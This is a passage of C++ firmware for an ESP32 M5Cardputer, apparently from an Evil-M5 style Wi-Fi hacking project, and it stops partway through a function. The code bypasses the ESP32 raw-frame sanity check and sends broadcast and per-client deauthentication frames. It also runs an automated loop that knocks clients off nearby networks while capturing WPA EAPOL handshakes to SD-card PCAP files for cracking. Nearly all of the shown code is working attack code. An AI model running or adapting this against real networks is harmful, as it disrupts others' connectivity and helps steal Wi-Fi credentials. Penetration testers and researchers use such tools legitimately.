void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beacon) {
  esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
  vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
  // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
  const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
  const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expéditeur (Adresse 2)
  const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
  const uint8_t *apAddr;

  if (memcmp(addr1, bssid, 6) == 0) {
    apAddr = addr1;
  } else {
    apAddr = addr2;
  }

  char nomFichier[50];
  sprintf(nomFichier, "/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
          apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

  // Vérifier si le fichier existe déjà
  bool fichierExiste = SD.exists(nomFichier);

  // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
  if (beacon && !fichierExiste) {
    return;
  }

  // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
  File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
  if (!fichierPcap) {
    Serial.println("Échec de l'ouverture du fichier PCAP");
    return;
  }

  if (!beacon && !fichierExiste) {
    Serial.println("Écriture de l'en-tête global du fichier PCAP");
    ecrireEntetePCAP(fichierPcap);
  }

  if (beacon && fichierExiste) {
    String bssidStr = String((char*)apAddr, 6);
    if (registeredBeacons.find(bssidStr) != registeredBeacons.end()) {
      return; // Beacon déjà enregistré pour ce BSSID
    }
    registeredBeacons.insert(bssidStr); // Ajouter le BSSID à l'ensemble
  }

  // Écrire l'en-tête du paquet et le paquet lui-même dans le fichier
  pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
  pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
  fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
  fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
  fichierPcap.close();
}
//sniff pcap end




// deauther start
// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
// Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
// Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
// Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser

// Warning
// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
// Warning

// Global MAC addresses
uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast
uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Global deauth frame initialized with default values
uint8_t deauth_frame[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Receiver MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0xf0, 0xff, 0x02, 0x00
};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

// Function to update MAC addresses in the global deauth frame
void updateMacAddresses(const uint8_t* bssid) {
    memcpy(source_mac, bssid, 6);
    memcpy(ap_mac, bssid, 6);

    // Update the global deauth frame with the source and BSSID
    memcpy(&deauth_frame[10], source_mac, 6);  // Source MAC
    memcpy(&deauth_frame[16], ap_mac, 6);      // BSSID
}

int deauthCount = 0;

void deauthAttack(int networkIndex) {
    if (!SD.exists("/handshakes")) {
        if (SD.mkdir("/handshakes")) {
            Serial.println("/handshakes folder created");
        } else {
            Serial.println("Fail to create /handshakes folder");
            return;
        }
    }

    String ssid = WiFi.SSID(networkIndex);
    if (!confirmPopup("      Deauth attack on:\n      " + ssid)) {
        inMenu = true;
        drawMenu();
        return;
    }

    Serial.println("Deauth attack started");
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300);  // Ensure previous operations complete
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);  // Set to station mode
    esp_wifi_start();  // Start Wi-Fi

    if (confirmPopup("   Do you want to sniff\n          EAPOL ?")) {
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
    }

    if (networkIndex < 0 || networkIndex >= numSsid) {
        Serial.println("Network index out of bounds");
        return;
    }

    M5.Display.clear();

    // Retrieve selected AP info
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    int channel = WiFi.channel(networkIndex);
    String macAddress = bssidToString(bssid);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    currentChannelDeauth = channel;
    updateMacAddresses(bssid);  // Update MAC addresses

    Serial.print("SSID: "); Serial.println(ssid);
    Serial.print("MAC Address: "); Serial.println(macAddress);
    Serial.print("Channel: "); Serial.println(channel);

    if (!bssid || channel <= 0) {
        Serial.println("Invalid AP - aborting attack");
        M5.Display.println("Invalid AP");
        return;
    }

    int delayTime = 500;  // Initial delay between deauth packets
    unsigned long previousMillis = 0;
    const int debounceDelay = 50;
    unsigned long lastDebounceTime = 0;

    // Setup display
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 16);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");

    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.setCursor(10, 20);
    M5.Display.println("SSID: " + ssid);
    M5.Display.setCursor(10, 34);
    M5.Display.println("MAC: " + macAddress);
    M5.Display.setCursor(10, 48);
    M5.Display.println("Channel : " + String(channel));

    M5.Display.setCursor(10, 62);
    M5.Display.print("Deauth sent: ");
    Serial.println("-------------------");
    Serial.println("Starting Deauth Attack");
    Serial.println("-------------------");
    enterDebounce();

    while (true) {
        unsigned long currentMillis = millis();

        if (currentMillis - previousMillis >= delayTime) {
            previousMillis = currentMillis;

            sendDeauthPacket();  // Send deauth using the global frame
            deauthCount++;
            pixels.setPixelColor(0, pixels.Color(255, 0, 0));
            pixels.show();
            delay(25);
            pixels.setPixelColor(0, pixels.Color(0, 0, 0));
            pixels.show();
            M5.Display.setCursor(132, 62);
            M5.Display.print(String(deauthCount));

            M5.Display.setCursor(10, 76);
            M5.Display.print("Delay: " + String(delayTime) + "ms    ");

            Serial.println("-------------------");
            Serial.println("Deauth packet sent : " + String(deauthCount));
            Serial.println("-------------------");
        }

        M5.update();
        M5Cardputer.update();

        // Adjust delay with buttons
        if (M5Cardputer.Keyboard.isKeyPressed(',') && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = max(500, delayTime - 100);  // Decrease delay
        }
        if (M5Cardputer.Keyboard.isKeyPressed('/') && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = min(3000, delayTime + 100);  // Increase delay
        }
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
            break;  // Stop the attack
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            inMenu = true;
            drawMenu();
            break;
        }
    }

    Serial.println("-------------------");
    Serial.println("Stopping Deauth Attack");
    Serial.println("-------------------");

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    waitAndReturnToMenu("Stopping Deauth Attack");
}

void sendDeauthPacket() {
    // Send the pre-defined global deauth frame
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    Serial.println();
}

void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
    static unsigned long lastEAPOLDisplayUpdate = 0;  // Temps de la dernière mise à jour de l'affichage EAPOL
    const int eapolDisplayDelay = 1000;  // Délai de mise à jour de l'affichage EAPOL

    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
    const uint8_t *frame = pkt->payload;
    const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);

    const uint8_t frameType = (frameControl & 0x0C) >> 2;
    const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

    unsigned long currentMillis = millis();

    if (estUnPaquetEAPOL(pkt)) {
        // Mettre à jour l'affichage EAPOL toutes les 500 ms
        const uint8_t *receiverAddr = frame + 4;
        const uint8_t *senderAddr = frame + 10;
        enregistrerDansFichierPCAP(pkt, false);
        nombreDeEAPOL++;
        if (currentMillis - lastEAPOLDisplayUpdate >= eapolDisplayDelay) {
            lastEAPOLDisplayUpdate = currentMillis;

            Serial.println("EAPOL Detected !!!!");
            pixels.setPixelColor(0, pixels.Color(0, 255, 0));
            pixels.show();
            delay(250);
            pixels.setPixelColor(0, pixels.Color(0, 0, 0));
            pixels.show();

            Serial.print("Address MAC destination: ");
            printAddress(receiverAddr);
            Serial.print("Address MAC expedition: ");
            printAddress(senderAddr);
            
            M5.Lcd.setCursor(M5.Display.width() - 36, 0);
            M5.Lcd.printf("H:");
            M5.Lcd.print(nombreDeHandshakes);
            if (nombreDeEAPOL < 99) {
                M5.Lcd.setCursor(M5.Display.width() - 36, 12);
            } else if (nombreDeEAPOL < 999) {
                M5.Lcd.setCursor(M5.Display.width() - 48, 12);
            } else {
                M5.Lcd.setCursor(M5.Display.width() - 60, 12);
            }
            M5.Lcd.printf("E:");
            M5.Lcd.print(nombreDeEAPOL);
        }
    }

    if (frameType == 0x00 && frameSubType == 0x08) {
        const uint8_t *senderAddr = frame + 10;  // Adresse source dans la trame de balise

        // Convertir l'adresse MAC en chaîne pour comparaison
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

        pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 octets
        enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
    }
}

//deauther end


// Sniff and deauth clients
bool macFromString(const std::string& macStr, uint8_t* macArray) {
  int values[6];  // Temporary array to store the parsed values
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
    // Convert to uint8_t
    for (int i = 0; i < 6; ++i) {
      macArray[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
  }
  return false;
}


void broadcastDeauthAttack(const uint8_t* ap_mac, int channel) {
  // Set the channel to the AP's channel
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }
  M5.Lcd.setCursor(67, 1);
  M5.Lcd.printf("C:");
  M5.Lcd.print(channel);
  M5.Lcd.print(" ");

  // Set AP and source MAC addresses
  updateMacAddresses(ap_mac);

  // Set the receiver MAC to broadcast
  memset(receiver_mac, 0xFF, 6);  // Broadcast MAC address

  Serial.println("-----------------------------");
  Serial.print("Deauth for AP MAC: ");
  Serial.println(mac_to_string(ap_mac).c_str());
  Serial.print("On Channel: ");
  Serial.println(channel);


  // Send 10 deauthentication packets
  for (int i = 0; i < nbDeauthSend; i++) {
    sendDeauthPacket();
  }
}

void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int channel) {
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }
  M5.Lcd.setCursor(67, 1);
  M5.Lcd.printf("C:");
  M5.Lcd.print(channel);
  M5.Lcd.print(" ");

  uint8_t deauth_frame[sizeof(deauth_frame)];
  memcpy(deauth_frame, deauth_frame, sizeof(deauth_frame));

  // Modifier les adresses MAC dans la trame de déauthentification
  memcpy(deauth_frame + 4, ap_mac, 6);  // Adresse MAC de l'AP (destinataire)
  memcpy(deauth_frame + 10, client_mac, 6);  // Source MAC client
  memcpy(deauth_frame + 16, ap_mac, 6);      // BSSID (AP)

  // Envoyer la trame modifiée
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  /*
    //Debugging output of packet contents
    Serial.println("Deauthentication Frame Sent:");
    for (int i = 0; i < sizeof(deauth_frame); i++) {
      Serial.print(deauth_frame[i], HEX);
      Serial.print(" ");
    }
    Serial.println();*/
}

void sendBroadcastDeauths() {
  for (auto& ap : connections) {
    if (!ap.second.empty() && isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
        vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
        Serial.println("-----------------------------");
        Serial.print("Sending Broadcast Deauth to AP: ");
        Serial.println(ap_names[ap.first].c_str());

        M5.Lcd.setCursor(M5.Display.width() / 2 - 80 , M5.Display.height() / 2 + 28);
        M5.Lcd.printf(ap_names[ap.first].c_str());

        int channel = ap_channels_map[ap.first];
        uint8_t ap_mac_address[6];
        if (macFromString(ap.first, ap_mac_address)) {
          broadcastDeauthAttack(ap_mac_address, channel);
          // Après l'attaque de broadcast, envoyer une trame à chaque client
          for (const auto& client : ap.second) {
            uint8_t client_mac[6];
            if (macFromString(client, client_mac)) {
              Serial.println("-----------------------------");
              Serial.print("Sending Deauth from client MAC ");
              Serial.print(mac_to_string(client_mac).c_str());
              Serial.print(" to AP MAC ");
              Serial.println(mac_to_string(ap_mac_address).c_str());

              M5.Lcd.setCursor(M5.Display.width() / 2 - 83 , M5.Display.height() / 2 + 16);
              M5.Lcd.printf("Sending Deauth to");

              for (int i = 0; i < nbDeauthSend; i++) {
                sendDeauthToClient(client_mac, ap_mac_address, channel);
              }
            }
          }
          vTaskDelay(deauthWaitingTime);
          M5.Lcd.setCursor(M5.Display.width() / 2 - 80, M5.Display.height() / 2 + 28);
          M5.Lcd.printf("                                ");
        } else {
          Serial.println("Failed to convert AP MAC address from string.");
        }
        M5.Lcd.setCursor(M5.Display.width() / 2 - 83  , M5.Display.height() / 2 + 16);
        M5.Lcd.printf("                       ");
      }
    }
  }
}

std::string mac_to_string(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return std::string(buf);
}

void changeChannel() {
  static auto it = ap_channels.begin(); // Initialisation de l'iterator

  // Vérification de l'existence de canaux
  if (ap_channels.empty()) {
    Serial.println("Aucun canal valide n'est disponible.");
    return;
  }

  if (it == ap_channels.end()) {
    it = ap_channels.begin();  // Réinitialiser l'iterator si nécessaire
  }

  int newChannel = *it;  // Récupérer le canal courant

  // Vérification de la validité du canal
  if (newChannel < 1 || newChannel > 13) {
    Serial.println("Canal invalide détecté. Réinitialisation au premier canal valide.");
    Serial.println(newChannel);
    Serial.println(*it);
    it = ap_channels.begin();  // Réinitialiser l'iterator
    newChannel = *it;  // Récupérer un canal valide
  }

  // Tentative de changement du canal Wi-Fi
  esp_err_t ret = esp_wifi_set_channel(newChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  // Mise à jour du canal actuel et avancement de l'iterator
  currentChannel = newChannel;
  it++;

  // Affichage de la confirmation du changement
  Serial.print("Switching channel on  ");
  Serial.println(currentChannel);
  Serial.println("-----------------------------");

  // Mise à jour de l'affichage sur l'appareil M5
  M5.Lcd.setCursor(67, 1);
  M5.Lcd.printf("C:%d ", currentChannel);
}


void wifi_scan() {
  Serial.println("-----------------------------");
  Serial.println("Scanning WiFi networks...");
  ap_channels.clear();
  M5.Lcd.setCursor(0, M5.Display.height() - 32 );
  M5.Lcd.printf("Scanning nearby networks..");

  int n = WiFi.scanNetworks(false, false);
  if (n == 0) {
    Serial.println("No networks found");
    M5.Lcd.setCursor(0, 1);
    M5.Lcd.printf("No AP  ");
    return;
  }

  Serial.print("Found ");
  Serial.print(n);
  Serial.println(" networks");

  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    int32_t rssi = WiFi.RSSI(i);
    uint8_t *bssid = WiFi.BSSID(i);
    int32_t channel = WiFi.channel(i);

    std::string bssidString = mac_to_string(bssid);
    ap_names[bssidString] = ssid.c_str();
    ap_channels.insert(channel);
    ap_channels_map[bssidString] = channel;

    // Convert std::string to const char* for Serial.print
    Serial.print(bssidString.c_str());
    Serial.print(" | ");
    Serial.print(ssid);
    Serial.print(" | Channel: ");
    Serial.println(channel);
  }

  Serial.println("-----------------------------");
  M5.Lcd.setCursor(0, 1);
  M5.Lcd.printf("AP:");
  M5.Lcd.print(n);
  M5.Lcd.print("  ");
  M5.Lcd.drawLine(0, 13, M5.Lcd.width(), 13, TFT_WHITE);
  delay(30);
  M5.Lcd.setCursor(0, M5.Display.height() - 32);
  M5.Lcd.printf("                          ");
}



bool isRegularAP(const std::string& mac) {
  std::regex multicastRegex("^(01:00:5e|33:33|ff:ff:ff|01:80:c2)");
  return !std::regex_search(mac, multicastRegex);
}
void print_connections() {
  int yPos = 15;  // Initial Y position for text on the screen

  for (auto& ap : connections) {
    if (isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        // Clear the line before printing new data
        M5.Lcd.fillRect(0, yPos, M5.Lcd.width(), 20, BLACK);

        // Print to Serial
        Serial.print(ap_names[ap.first].c_str());
        Serial.print(" (");
        Serial.print(ap.first.c_str());
        Serial.print(") on channel ");
        Serial.print(ap_channels_map[ap.first]);
        Serial.print(" has ");
        Serial.print(ap.second.size());
        Serial.println(" clients:");
        for (auto& client : ap.second) {
          Serial.print(" - ");
          Serial.println(client.c_str());
        }
        // Print to screen
        String currentAPName = String(ap_names[ap.first].c_str());
        int clientCount = ap.second.size();
        String displayText = currentAPName + ": " + String(clientCount);

        M5.Lcd.setCursor(0, yPos);
        M5.Lcd.println(displayText);

        yPos += 12;  // Move the Y position for the next line

        // Ensure there is enough screen space for the next line
        if (yPos > M5.Lcd.height() - 15) {
          break;  // Exit the loop if there's not enough space for more lines
        }
      }
    }
  }
  Serial.println("-----------------------------");
}


void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  const uint8_t *bssid = frame + 16; // BSSID position for management frames
  std::string bssidStr = mac_to_string(bssid);

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("-----------------------------");
    Serial.println("EAPOL Detected !!!!!!!!!!!!!!!");
    // Extract the BSSID from the packet, typically found at Address 3 in most WiFi frames
    const uint8_t *bssid = frame + 16;

    // Convert the BSSID to string format
    std::string bssidStr = mac_to_string(bssid);

    // Look up the AP name using the BSSID
    std::string apName = ap_names[bssidStr];

    // Print the AP name to the serial output
    Serial.print("EAPOL Detected from AP: ");
    if (!apName.empty()) {
      Serial.println(apName.c_str());
      M5.Lcd.setCursor(0 , M5.Display.height() - 10);
      String eapolapname = apName.c_str();
      M5.Lcd.print("EAPOL!:" + eapolapname + "                         ");
    } else {
      Serial.println("Unknown AP");
      M5.Lcd.setCursor(0 , M5.Display.height() - 8);
      M5.Lcd.printf("EAPOL from Unknow                                 ");
    }
    Serial.println("-----------------------------");


    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(116, 1);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 99) {
      M5.Lcd.setCursor(164, 1);
    } else {
      M5.Lcd.setCursor(155, 1);
    }
    M5.Lcd.printf("E:");
    M5.Lcd.print(nombreDeEAPOL);
    esp_task_wdt_reset();  // Réinitialisation du watchdog
    // Délay pour permettre au task IDLE de s'exécuter
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);


    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
    esp_task_wdt_reset();  // Réinitialisation du watchdog
    vTaskDelay(pdMS_TO_TICKS(10));
    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
  }

  if (frameType != 2) return;

  const uint8_t *mac_ap = frame + 4;
  const uint8_t *mac_client = frame + 10;
  std::string ap_mac = mac_to_string(mac_ap);
  std::string client_mac = mac_to_string(mac_client);

  if (!isRegularAP(ap_mac) || ap_mac == client_mac) return;

  if (connections.find(ap_mac) == connections.end()) {
    connections[ap_mac] = std::vector<std::string>();
  }
  if (std::find(connections[ap_mac].begin(), connections[ap_mac].end(), client_mac) == connections[ap_mac].end()) {
    connections[ap_mac].push_back(client_mac);
  }
}


void purgeAllAPData() {
  connections.clear();  // Clears all client associations
  M5.Lcd.fillRect(0, 14, M5.Lcd.width(), M5.Lcd.height() - 14, BLACK);
  Serial.println("All AP and client data have been purged.");
}


void deauthClients() {
  M5.Display.clear();

  //ESP_BT.end();
  //bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true);  // Déconnecte et efface les paramètres WiFi enregistrés
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_restore();
  delay(270); // Petite pause pour s'assurer que tout est terminé

  nvs_flash_init();
  wifi_init_config_t cfg4 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg4);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);;
  esp_wifi_start();
  delay(30);

  esp_err_t ret = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  purgeAllAPData();
  wifi_scan();

  M5.Lcd.fillRect(0, 14, M5.Lcd.width(), M5.Lcd.height() - 14, BLACK);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);

  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setCursor(M5.Display.width() - 30, 1);
  M5.Lcd.printf("D:");
  if (isDeauthActive) {
    M5.Lcd.print("1");
  } else {
    M5.Lcd.print("0");
  }
  enterDebounce();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 1000;

  unsigned long lastScanTime = millis();
  unsigned long lastChannelChange = millis();
  unsigned long lastClientPurge = millis();
  unsigned long lastTimeUpdate = millis();
  unsigned long lastPrintTime = millis();

  while (true) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    M5Cardputer.update();

    unsigned long currentPressTime = millis();
    unsigned long currentTimeAuto = millis();

    if (currentTimeAuto - lastTimeUpdate >= 2000) {
      unsigned long timeToNextScan = scanInterval - (currentTimeAuto - lastScanTime);
      unsigned long timeToNextPurge = clientPurgeInterval - (currentTimeAuto - lastClientPurge);
      unsigned long timeToNextChannelChange = channelChangeInterval - (currentTimeAuto - lastChannelChange);
      Serial.println("-----------------");
      Serial.print("Time to next scan: ");
      Serial.print(timeToNextScan / 1000);
      Serial.println(" seconds");

      Serial.print("Time to next purge: ");
      Serial.print(timeToNextPurge / 1000);
      Serial.println(" seconds");

      Serial.print("Time to next channel change: ");
      Serial.print(timeToNextChannelChange / 1000);
      Serial.println(" seconds");
      Serial.println("-----------------");
      lastTimeUpdate = currentTimeAuto;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('d') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      isDeauthActive = !isDeauthActive;
      Serial.println(isDeauthActive ? "Deauther activated !" : "Deauther disabled !");
      M5.Lcd.setCursor(M5.Display.width() - 30, 1);
      M5.Lcd.printf("D:%d", isDeauthActive ? 1 : 0);
      lastKeyPressTime = currentPressTime;
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(NULL);
      break;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('f') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      if (!isDeauthFast) {
        isDeauthFast = true;
        scanInterval = 30000; // interval of deauth and scanning network fast
        channelChangeInterval = 5000; // interval of channel switching fast
        clientPurgeInterval = 60000; //interval of clearing the client to exclude no more connected client or ap that not near anymore fast
        deauthWaitingTime = 5000;
        nbDeauthSend = 5;
        Serial.println("Fast mode enabled !");
        M5.Lcd.setCursor(M5.Display.width() - 40, 1);
        M5.Lcd.printf("F");
      } else {
        isDeauthFast = false;
        scanInterval = 90000; // interval of deauth and scanning network
        channelChangeInterval = 15000; // interval of channel switching
        clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore
        deauthWaitingTime = 7500;
        nbDeauthSend = 10;
        Serial.println("Fast mode disabled !");
        M5.Lcd.setCursor(M5.Display.width() - 40, 1);
        M5.Lcd.printf(" ");
      }
      lastKeyPressTime = currentPressTime;
    }

    // Lancement d'un scan et deauthbroadcast toutes les 60 secondes
    if (currentTimeAuto - lastScanTime >= scanInterval) {
      if (isDeauthActive) {
        sendBroadcastDeauths();  // Déconnexion broadcast
      }
      esp_wifi_set_promiscuous_rx_cb(NULL);
      wifi_scan();  // Lancement du scan
      esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
      lastScanTime = currentTimeAuto;
      lastChannelChange = currentTimeAuto;  // Réinitialisation du timer pour éviter les conflits avec le changement de canal
    }

    // Purge des clients toutes les 5 minutes, assuré de ne pas coincider avec le scan
    if (currentTimeAuto - lastClientPurge >= clientPurgeInterval && currentTimeAuto - lastScanTime >= 1000) {
      purgeAllAPData();  // Purge des données
      lastClientPurge = currentTimeAuto;
    }

    // Gestion de l'affichage des connexions toutes les 2 secondes
    if (currentTimeAuto - lastPrintTime >= 2000) { // 2 seconde
      print_connections();
      lastPrintTime = currentTimeAuto;
    }


    // Changement de channel toutes les 15 secondes, seulement si un scan n'est pas en cours
    if (currentTimeAuto - lastChannelChange >= channelChangeInterval && currentTimeAuto - lastScanTime >= 1000) {
      changeChannel();
      lastChannelChange = currentTimeAuto;
    }

  }
  waitAndReturnToMenu("Stopping Sniffing...");
}


// Sniff and deauth clients end


//Check handshake
std::vector<String> pcapFiles;
int currentListIndexPcap = 0;

void checkHandshakes() {
  loadPcapFiles();
  displayPcapList();
  enterDebounce();

  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
  const unsigned long debounceDelay = 250;  // Delai de debounce en millisecondes

  while (true) {
    M5.update();
    M5Cardputer.update();
    unsigned long currentPressTime = millis();

    if (M5Cardputer.Keyboard.isKeyPressed('.') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      navigatePcapList(true); // naviguer vers le bas
      lastKeyPressTime = currentPressTime;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(';') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      navigatePcapList(false); // naviguer vers le haut
      lastKeyPressTime = currentPressTime;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      waitAndReturnToMenu("return to menu");
      return;
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      inMenu = true;
      drawMenu();
      break;
    }
  }
}


void loadPcapFiles() {
  File root = SD.open("/handshakes");
  pcapFiles.clear();
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.endsWith(".pcap")) {
        pcapFiles.push_back(filename);
      }
    }
  }
  if (pcapFiles.size() > 0) {
    currentListIndexPcap = 0; // Réinitialisez l'indice si de nouveaux fichiers sont chargés
  }
}

void displayPcapList() {
  const int listDisplayLimit = M5.Display.height() / 18;
  int listStartIndex = max(0, min(currentListIndexPcap, int(pcapFiles.size()) - listDisplayLimit));

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
